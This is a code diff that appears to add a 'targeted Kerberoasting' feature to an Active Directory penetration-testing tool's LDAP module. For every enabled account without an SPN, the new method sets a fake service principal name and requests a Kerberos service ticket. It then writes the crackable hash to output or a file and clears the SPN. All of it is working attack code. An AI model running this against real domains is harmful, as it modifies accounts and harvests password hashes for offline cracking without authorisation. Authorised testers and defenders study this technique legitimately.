@@ -3,6 +3,7 @@
 import hashlib
 import hmac
 import os
+import ldap3
 from errno import EHOSTUNREACH, ETIMEDOUT, ENETUNREACH
 from binascii import hexlify
 from datetime import datetime
@@ -11,6 +12,7 @@ from zipfile import ZipFile
 from termcolor import colored
 from dns import resolver
 from dateutil.relativedelta import relativedelta as rd
+from ldap3 import MODIFY_REPLACE
 
 from Cryptodome.Hash import MD4
 from OpenSSL.SSL import SysCallError
@@ -1104,6 +1106,81 @@ class ldap(connection):
                         self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.domain}\\{self.username} from {self.kdcHost}")
+    
+    def targetedkerberoast(self):
+        # enumerate users without SPN
+        search_filter = "(&(objectCategory=person)(!(servicePrincipalName=*)))"
+        attrs = ["distinguishedName", "sAMAccountName", "userAccountControl"]
+        resp = parse_result_attributes(self.search(search_filter, attrs, 0))
+        if not resp:
+            self.logger.highlight("No users without SPN found.")
+            return
+
+        enabled = [u for u in resp if not int(u["userAccountControl"]) & 0x2]
+        self.logger.display(f"Found {len(enabled)} enabled users without SPN.")
+
+        # kerberos bind via ldap3
+        lmhash = nthash = ""
+        if self.args.hash:
+            h = self.args.hash[0] if isinstance(self.args.hash, list) else self.args.hash
+            if h:
+                parts = h.split(":", 1)
+                lmhash, nthash = parts if len(parts) == 2 else ("", parts[0])
+
+        ok, conn = self.ldap3_kerberos_login(
+            user=self.username or "",
+            password=self.password or "",
+            lmhash=lmhash,
+            nthash=nthash,
+            aes_key=self.args.aesKey[0] if self.args.aesKey else "",
+            kdcHost=self.kdcHost,
+            useCache=bool(self.args.use_kcache),
+        )
+        if not ok:
+            self.logger.fail("Kerberos bind failed.")
+            return
+
+        hashes, logs, success = [], [], []
+        for u in enabled:
+            dn = u["distinguishedName"]
+            sam = u["sAMAccountName"]
+            spn = f"test/{sam}"
+            try:
+                if not conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [spn])] }):
+                    logs.append(("debug", f"Failed to add SPN for {sam}: {conn.result}"))
+                    continue
+                logs.append(("success", f"SPN added successfully for {sam}"))
+
+                tgt = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
+                if not tgt:
+                    logs.append(("fail", f"No TGT for {sam}"))
+                    continue
+
+                princ = Principal(); princ.type = constants.PrincipalNameType.NT_SRV_INST.value
+                princ.components = spn.split("/")
+                tgs, cipher, old_sk, sk = getKerberosTGS(
+                    princ, self.domain, self.kdcHost,
+                    tgt["KDC_REP"], tgt["cipher"], tgt["sessionKey"]
+                )
+                h = KerberosAttacks(self).output_tgs(tgs, old_sk, sk, sam, spn)
+                hashes.append(h); success.append((dn, sam)); logs.append(("highlight", h))
+
+                if self.args.targetedkerberoast:
+                    with open(self.args.targetedkerberoast, "a", encoding="utf-8") as f:
+                        f.write(h + "\n")
+
+                if conn.modify(dn, {"servicePrincipalName": [(MODIFY_REPLACE, [])]}):
+                    logs.append(("success", f"SPN removed successfully for {sam}"))
+                else:
+                    logs.append(("debug", f"Failed to remove SPN for {sam}: {conn.result}"))
+            except Exception as e:
+                logs.append(("fail", f"Error for {sam}: {e}"))
+                self.logger.debug("Traceback", exc_info=True)
+
+        self.logger.display(f"Total of records returned: {len(success)}")
+        for lvl, msg in logs:
+            getattr(self.logger, lvl)(msg)
+        conn.unbind()
 
     def query(self):
         """
